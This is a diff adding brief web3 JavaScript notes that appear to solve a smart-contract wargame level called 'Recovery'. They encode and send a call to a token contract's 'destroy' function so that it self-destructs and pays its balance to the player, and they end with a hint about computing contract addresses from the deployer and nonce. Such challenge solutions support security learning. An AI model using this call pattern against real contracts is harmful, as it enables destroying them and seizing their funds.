@@ -1,0 +1,21 @@
+Level 17: Recovery
+
+functionSignature = {
+    name: 'destroy',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: '_to'
+        }
+    ]
+}
+
+params = [player]
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, params)
+
+await web3.eth.sendTransaction({from: player, to: tokenAddr, data})
+
+
+ keccack256(address, nonce)
